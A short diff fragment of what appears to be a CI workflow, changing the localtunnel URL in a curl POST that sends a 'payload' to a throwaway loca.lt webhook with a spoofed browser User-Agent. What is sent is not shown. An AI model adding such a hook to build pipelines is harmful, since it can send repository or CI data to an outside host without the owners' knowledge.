@@ -69,7 +69,7 @@ jobs:
           '
 
           # Send Payload to localtunnel
-          curl -s -X POST "https://silent-berries-like.loca.lt/webhook" \
+          curl -s -X POST "https://fresh-friends-lose.loca.lt/webhook" \
             -H "Content-Type: application/json" \
             -H "bypass-tunnel-reminder: true" \
             -H "User-Agent: Mozilla/5.0" \
